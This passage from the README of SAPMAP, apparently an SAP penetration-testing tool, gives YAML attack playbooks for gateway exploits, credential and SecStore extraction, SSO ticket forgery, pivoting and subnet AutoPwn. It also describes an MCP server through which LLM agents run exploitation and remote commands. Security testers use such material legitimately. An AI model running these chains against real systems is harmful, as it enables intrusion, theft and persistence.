Arming is destructive (writes a 91 KB binary + patches `disp+work` text) so a dry-run playbook will `[SKIP]` it — the disarm step still fires, but with nothing armed it's a no-op.  Re-run the same YAML with `--confirm` to actually arm.

### Per-Step Options

Every step supports these optional fields:

| Option | Default | Description |
|--------|---------|-------------|
| `timeout` | 300 | Maximum seconds to wait for the step to complete |
| `delay` | 1 | Seconds to pause after the step finishes |
| `required` | false | If `true`, abort the entire script when this step fails |

### Example: Full 10KBlaze Chain

```yaml
name: "10KBlaze Full Chain Demo"
description: "Compromise SAP S4H via betrusted + GW exploit, then extract business data"

steps:
  - action: add_system
    sid: S4H
    ip: 192.168.2.209
    instance: "00"

  - action: check_gw
    target: S4H

  - action: check_ms
    target: S4H

  - action: betrusted
    target: S4H
    attacker_ip: auto

  - action: create_user
    target: S4H
    method: gw_exploit
    client: "001"

  - action: retrieve_rfcs
    target: S4H

  - action: download_secstore
    target: S4H

  - action: impact_assess
    target: S4H
    client: "001"
```

### Example: Multi-System Landscape

```yaml
name: "SAP Landscape Attack"
description: "Scan 3 systems, exploit, propagate, analyze trust chains"

steps:
  - action: add_system
    sid: S4H
    ip: 192.168.2.209
    instance: "00"

  - action: add_system
    sid: TWT
    ip: 192.168.2.60
    instance: "00"

  - action: add_system
    sid: ORA
    ip: 192.168.2.16
    instance: "00"

  - action: check_all_gw

  - action: check_all_betrusted
    attacker_ip: auto

  - action: create_user
    target: S4H
    method: gw_exploit
    client: "001"

  - action: retrieve_rfcs
    target: S4H

  - action: impact_assess
    target: S4H
    client: "001"

  - action: analyze_chains
```

### Example: AutoPwn on a Subnet

Fire-and-forget end-to-end run.  AutoPwn discovers, scans, exploits, propagates and stops when no new nodes come in.

```yaml
name: "Landscape AutoPwn"
description: "Scan the subnet then run the convergence loop"

steps:
  - action: scan
    targets: "10.10.1.0/24"
    mode: fast

  - action: autopwn
    max_waves: 5
    scan_10kblaze: false
    include_lpe: false
    include_btp: true
```

### Example: SB6 (ABAP) → SJJ (Java, firewalled) → S4D via SAPControl OSExecute

Chain the Type-G SAPControl OSExecute pivot to reach a Java stack whose gateway is firewalled, extract its SecStore, and land credentials on the ABAP backend it talks to.

```yaml
name: "Type-G pivot chain"
description: "SB6 -> SJJ via SAPControl OSExecute -> S4D via recovered SecStore creds"

steps:
  # Compromise the source ABAP
  - action: add_system
    sid: SB6
    ip: 10.10.1.22
    instance: "00"

  - action: check_gw
    target: SB6

  - action: create_user
    target: SB6
    method: gw_exploit
    client: "001"

  # Retrieve destinations — Type-G endpoints get the SAPControl auth probe
  # inline; a successful probe caches the OSExecute pivot on SJJ.
  - action: retrieve_rfcs
    target: SB6

  - action: test_rfcs
    target: SB6

  # Extract SJJ's SecStore via the cached SAPControl pivot (JSP writes
  # transparently route through OSExecute; no gateway 33NN needed).
  - action: java_secstore
    target: SJJ

  # S4D was auto-plotted from a JCo destination in SJJ's SecStore.
  # Test the recovered edge — RFCDES host wins over the discovered
  # node IP (see aad27c7).  If has_sap_all, we're in.
  - action: test_rfc_single
    target: SJJ
    destination: to_s4d

  - action: analyze_chains
```

### Example: MYSAPSSO2 fan-out from a pwned issuer

```yaml
name: "SAPSYS fan-out"
description: "Forge a SAP* ticket on the issuer then replay against every trusted receiver"

steps:
  - action: create_user
    target: NPL
    method: gw_exploit
    client: "001"

  - action: discover_strustsso2
    target: NPL

  - action: forge_and_fanout
    target: NPL
    user: "SAP*"
    client: "100"
    validity_min: 240
    channels: ["http", "rfc"]
```

### Console Output

The script logs progress to the SAPMAP console:

```
[SCRIPT] === 10KBlaze Full Chain Demo ===
[SCRIPT] Compromise SAP S4H via betrusted + GW exploit, then extract business data
[SCRIPT] 8 steps to execute

[SCRIPT] Step 1/8: add_system on S4H
[SCRIPT] Step 1/8: completed
[SCRIPT] Step 2/8: check_gw on S4H
[SCRIPT] Step 2/8: completed
...
[SCRIPT] === All 8 steps completed ===
```

---

## MCP Server

SAPMAP includes a [Model Context Protocol](https://modelcontextprotocol.io/) (MCP) server that exposes SAPMAP's capabilities as 29 curated tool functions plus a generic passthrough, allowing LLM agents (Claude, GPT, etc.) to drive SAPMAP programmatically.  The MCP server runs as a separate process using stdio transport, connecting to SAPMAP's Bottle HTTP server over localhost.

### Quick Start

```bash
# Terminal 1: Start SAPMAP
python3 sapmap.py --no-gui --port 8080

# Terminal 2: Run the MCP server standalone
python3 modules/mcp/sapmap_mcp_server.py --port 8080
```

Or launch both together:

```bash
python3 sapmap.py --mcp --port 8080
```

### Claude Code (.mcp.json)

Create a `.mcp.json` in the SAPMAP directory (already gitignored):

```json
{
  "mcpServers": {
    "sapmap": {
      "command": "python3",
      "args": ["modules/mcp/sapmap_mcp_server.py", "--port", "8080"]
    }
  }
}
```

Then start SAPMAP (`python3 sapmap.py --no-gui --port 8080`) and open Claude Code in the same directory — it will detect and offer to connect to the SAPMAP MCP server.

### Claude Desktop (claude_desktop_config.json)

```json
{
  "mcpServers": {
    "sapmap": {
      "command": "python3",
      "args": ["modules/mcp/sapmap_mcp_server.py", "--port", "8080"],
      "cwd": "/path/to/SAPMAP"
    }
  }
}
```

### MCP Inspector (debugging)

```bash
npx @modelcontextprotocol/inspector python3 modules/mcp/sapmap_mcp_server.py --port 8080
```

Opens a browser UI to browse tool schemas, call tools interactively, and inspect JSON-RPC traffic.

### Available Tools (29)

| Tool | Description |
|------|-------------|
| **Landscape & State** | |
| `get_landscape` | Current landscape state — systems, findings, tasks |
| `get_system_detail` | Detailed info for a specific SID |
| `get_findings` | All security findings by severity |
| `get_attack_chains` | RFC trust-chain attack path analysis |
| `save_state` | Save session to `.sapmap` file |
| **System Management** | |
| `add_system` | Add an SAP system to the map |
| `set_credentials` | Store credentials for a system |
| `configure_system` | Set system type, DB, OS, SAProuter |
| **Scanning & Discovery** | |
| `scan_network` | Scan a network range for SAP systems |
| `probe_system` | Probe a system (RFC info, clients, SNC, ports) |
| `check_default_credentials` | Test 16 default SAP credentials |
| **Vulnerability Checking** | |
| `check_vulnerability` | Check specific CVEs (GW, MS, 31324, RECON, ICMAD) |
| **Exploitation** | |
| `exploit` | Execute exploitation actions (requires `confirm: true`) |
| `exec_command` | OS command execution on pwned systems |
| `autopwn` | Full convergence loop — scan → exploit → propagate |
| **RFC & Lateral Movement** | |
| `manage_rfcs` | RFC destination discovery, testing, propagation |
| `create_user_via_rfc` | Create SAPMAP user on remote system via RFC destination |
| `create_tcpip_dest` | Create TCP/IP (Type-T) RFC destination for pivoting |
| `sapcontrol_osexecute` | OS command execution via SAPControl Type-G destination |
| **Data Extraction** | |
| `extract_data` | Hashes, SecStore, tables, OA2C, Java artifacts |
| **Cloud & SCC** | |
| `scc_action` | SAP Cloud Connector operations |
| `btp_action` | BTP cloud lateral movement |
| **Identity & Persistence** | |
| `ticket_forgery` | MYSAPSSO2 ticket forging and fanout |
| `ssh_lateral` | SSH key harvesting, testing, planting |
| **RanSAPware** | |
| `ransapware` | RanSAPware Awareness PoC operations |
| **Reporting & Cleanup** | |
| `business_impact` | Impact assessment scenarios |
| `export_report` | Generate engagement report |
| `cleanup` | Remove SAPMAP-created users |
| **Generic** | |
| `run_sapmap_action` | Passthrough for any scripting action not covered above |

### Safety

All exploitation and lateral movement tools require `confirm: true` to execute — without it they return a preview of what would happen.  This mirrors the `--confirm` gate from Scripted Scenarios and prevents accidental exploitation by an LLM agent.

### Resources

The MCP server also exposes read-only MCP resources:

- `sapmap://landscape` — Full landscape state with system summaries
- `sapmap://findings` — Security findings sorted by severity
- `sapmap://console` — Recent console output from SAPMAP operations
- `sapmap://chains` — RFC trust-chain attack paths

---

## State Management

### Saving & Loading

SAPMAP sessions are saved as `.sapmap` JSON files containing all nodes, connections, created users, and map positions. State is auto-saved on exit.

```bash
# Save via GUI: Ctrl+S or File menu
# Load via CLI:
python3 sapmap.py --load states/landscape_2026-03-11.sapmap
```

### Persistent Caches

Separate from session state, these persist across sessions:
- **RFC check cache** (`.sapmap_rfc_cache.json`) — Cached destination test results
- **Created destinations** (`.sapmap_created_destinations.json`) — Log of TCP/IP destinations created

---

## Testing

SAPMAP includes a unit test suite (2220 tests across 50+ files) that validates core logic without network access:

```bash
python3 -m pytest tests/ -v
```

`tests/conftest.py` registers the `modules/*` subpackages on `sys.path` so test files can keep their flat-import style.  All tests run in ~17 seconds.

| Test File | Tests | Coverage |
|-----------|-------|----------|
| `test_ms_betrusted.py` | 114 | MS header build/parse, LOGIN/LOGOUT/MOD_STATE, ADM records, DP info, NILIST reply, opcode parsing |
| `test_10kblaze_extended.py` | 57 | MS_CHANGE_IP, MS_SET_LOGON, GWMON reply, old NILIST body, NI framing, GW sub-structures |
| `test_scc_modules.py` | 48 | CVE buckets, SCC mapping normalisation, backup-zip parsing, users.xml multi-user / attribute-order, probe_mapping, Windows multi-drive discovery, \usr\scc layout |
| `test_10kblaze.py` | 42 | P1 lu_name fix, app-server name derivation, DP versions, NILIST IP reply, hostname extraction |
| `test_p3_features.py` | 30 | CopyFail kernel detection, check_copyfail early-exit branches, SCC fingerprint probe ladder, execute_local_command dest reuse |
| `test_recent_features.py` | 29 | format_rfc_exception extractor, ensure_loot_dir + LOOT_* constants, download_password_hashes 5-method fallback chain, categorise_entry / classify_entry |
| `test_secstore_decrypt.py` | 25 | RSECTAB decryption, keyprime derivation, IDENT categorisation, SSFS key extraction |
| `test_report.py` | 25 | Engagement report Markdown + HTML — KPIs, finding cards, structural recommendations, SVG landscape map, password masking, HTML escape, SCCs folded into inventory |
| `test_extracted_modules.py` | 23 | Smoke + import-shape tests for the 5 Tier-2 extracted modules: every public name resolves, AST scan for unresolved free names, signature drift, lazy-proxy hot-swap |
| `test_diff.py` | 19 | Diff between .sapmap snapshots — added/removed/changed nodes, new/remediated findings, trust-chain delta, summary roll-up, Markdown + HTML rendering invariants |
| `test_gw_protocol.py` | 12 | P1/P2 packet building, parse_response, hexdump, TLV encoding, SAPRFXPG |
| `test_rsec_cipher.py` | 11 | RSECCipher encode/decode roundtrip, rsec_decrypt, rsec_decrypt_key |
| `test_models.py` | 9 | Data model serialization, risk_level, best_credentials, state management |
| `test_config.py` | 8 | Username generation, DB type normalization, SQL generators |
| `test_evasion_tier3_foundation.py` | 83 | Tier 3 evasion: baseline capture/restore, legacy SAL read/write, stealth slot disable, RSAU API probe, dynamic profile dump, arm-gate enforcement |
| `test_chain.py`, `test_impact.py`, `test_java_*.py`, `test_router_*.py`, `test_saprouter.py`, `test_shell.py`, `test_cve_2020_6287.py`, `test_additions_today.py`, `test_java_secstore_offline.py` | ~380 | RFC trust chains, business impact engine, Java CTC/Telnet deploy helpers, SAProuter NI tunnel, router info, SAP shell builders, CVE-2020-6287 user creation, miscellaneous additions |

---

## Configuration

Key constants in `modules/core/sapmap_config.py`:

### User Creation

| Setting | Value | Description |
|---------|-------|-------------|
| `SAPMAP_USER_PREFIX` | `SAPMAP` | Username prefix (SAPMAP00–SAPMAP99) |
| `SAPMAP_PASSWORD` | `Andinyougo123!` | Password for all created users |
| `USER_TYPE` | `S` | Service user (no dialog logon restrictions) |
| `CODVN` | `G` | Password hash version (SHA-1 salted, kernel 7.x) |

### Scanning

| Setting | Default | Description |
|---------|---------|-------------|
| `DEFAULT_INSTANCE_RANGE` | `(0, 99)` | SAP instance numbers to scan |
| `DEFAULT_THREADS` | `20` | Concurrent scan threads |
| `DEFAULT_TIMEOUT` | `3` | Socket timeout in seconds |

### Supported Database Types

| Code | Database |
|------|----------|
| HDB | SAP HANA |
| ADA | MaxDB / SAP DB / ADABAS D |
| MSS | Microsoft SQL Server |
| ORA | Oracle |
| DB6 | IBM DB2 |

### Supported OS Types

Linux, Windows, AIX, HP-UX, SunOS

---

## License

SAPMAP is licensed under the GNU General Public License v3.0 (or, at
your option, any later version) — see [LICENSE](LICENSE) and
[NOTICE](NOTICE) for details, including third-party code ported from
the [pysap](https://github.com/OWASP/pysap) project (GPLv2-or-later).

For authorized security testing only. Unauthorized access to computer systems is illegal. See [DISCLAIMER.md](DISCLAIMER.md).
